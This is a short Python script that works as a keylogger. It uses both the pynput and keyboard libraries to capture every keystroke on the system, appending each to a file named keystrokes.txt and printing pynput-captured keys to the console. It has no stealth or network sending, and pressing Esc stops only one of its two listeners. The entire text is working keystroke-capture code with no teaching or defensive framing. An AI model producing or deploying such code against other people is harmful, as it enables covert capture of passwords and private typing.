import threading
from pynput import keyboard
import keyboard as kb_module  # Alias to differentiate if needed

# File to store keystrokes
file_path = "keystrokes.txt"

def write_to_file(key_name):
    """
    Writes the key name to the keystrokes file.
    """
    try:
        with open(file_path, "a") as f:
            f.write(f"{key_name}\n")
    except Exception as e:
        print(f"Error writing to file: {e}")

# Function to handle key press using pynput
def on_press(key):
    try:
        key_name = key.char if key.char else str(key)
        print(f"Alphanumeric key {key_name} pressed")
        write_to_file(key_name)
    except AttributeError:
        print(f"Special key {key} pressed")
        write_to_file(str(key))

# Function to handle key release using pynput
def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Listener thread for pynput
def start_pynput_listener():
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

# Function for keyboard module key listener
def on_key_press(event):
    write_to_file(event.name)

# Start the keyboard module listener in a separate thread
keyboard_thread = threading.Thread(target=lambda: kb_module.on_press(on_key_press))
keyboard_thread.start()

# Start the pynput listener
start_pynput_listener()

# Keep the script running
kb_module.wait()